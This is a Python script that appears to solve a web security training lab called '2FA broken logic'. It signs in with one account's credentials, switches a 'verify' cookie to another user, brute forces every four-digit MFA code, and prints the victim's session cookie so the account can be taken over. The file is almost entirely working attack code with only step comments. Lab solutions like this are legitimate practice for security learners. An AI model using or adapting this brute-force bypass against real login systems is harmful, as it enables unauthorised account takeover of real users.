#################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 26/8/2023
#
# Lab: 2FA broken logic
#
# Steps: 1. Get a valid session using valid creds
#        2. GET /login2 page
#        3. Brute force the mfa-codes
#
#################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore
import time


############################################################
#  Function used to get a valid session using correct creds
############################################################
def get_valid_session(url, username, password):
    # set data to send via POST
    data = {
        "username": username,
        "password": password
    }

    try:
        # try to login 
        res = requests.post(url=f"{url}/login", data=data, allow_redirects=False)

    except:
        print(Fore.RED + "Failed to get a valid session through exception")
        exit(1)

    # get session cookie
    session = re.findall("session=(.*); Secure", res.headers['set-cookie'])[0]
    
    print(Fore.WHITE + '1. Obtaining a valid session.. OK')
    
    return session
    

#####################################
# Function used to GET /login2 page
#####################################
def fetch_login2(url, user, session):
    # set cookie header
    headers = {
        "Cookie": f"session={session}; verify={user}",
    }

    try:
        # try to fetch /login2 page
        res = requests.get(url=f"{url}/login2", headers=headers)
        
    except:
        print(Fore.RED + "Failed to fetch /login2 through exception")
        exit(1)

    print(Fore.WHITE + '2. GET /login2 page.. OK')
    return


#####################################
# Function used to POST the mfa code
#####################################
def post_code(url, user, session, code):
    # set data to send via POST
    data = {
        "mfa-code": f"{code:04}"
    }

    # set headers
    headers = {
        "Cookie": f"session={session}; verify={user}",
    }

    try:
        # try to send the mfa code
        res = requests.post(url=f"{url}/login2", data=data, headers=headers, allow_redirects=False)
        
    except:
        print(Fore.RED + "Failed to post code through exception")

    # return the response
    return res
    

#########
# Main
#########

# change this to your lab URL
url = "https://0a280071048f0b9b812cb10c00e800c5.web-security-academy.net"

# get valid session as wiener
session = get_valid_session(url, "wiener", "peter")

# fetch /login2 page as carlos
fetch_login2(url, "carlos", session)

print(Fore.WHITE + "3. Start brute forcing mfa-code ..")

# capture the time before brute forcing
start_time = time.time()

# iterate over all possible codes
for code in range(0, 10000):
    # try to post an mfs code
    res = post_code(url, "carlos", session, code)

    # if a redirect happened which means the mfa code is correct
    if res != None and res.status_code == 302:
        print(Fore.WHITE + f"\n[*] {code:04} => " + Fore.GREEN + "Correct")
        
        # get session cookie
        new_session = res.cookies.get("session")
        
        print(Fore.WHITE + "✅ New session: " + Fore.GREEN + new_session)
        print(Fore.WHITE + "Use this session in your browser to login as " + Fore.GREEN + "carlos")    

        # calculate the elapsed time
        elapsed_time = int((time.time() - start_time) / 60)
        
        print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")
        
        # exit from the program
        exit(0)
    
    else:
        print("\r" + Fore.WHITE + f"[*] {code:04} => " + Fore.RED + "Incorrect", flush=True, end='\r')

# reaching this point means that you did't find any valid mfa codes
# calcualte the elapsed time
elapsed_time = int((time.time() - start_time) / 60)

print(Fore.GREEN + "✅ Finished in: " + Fore.WHITE + str(elapsed_time) + " minutes")
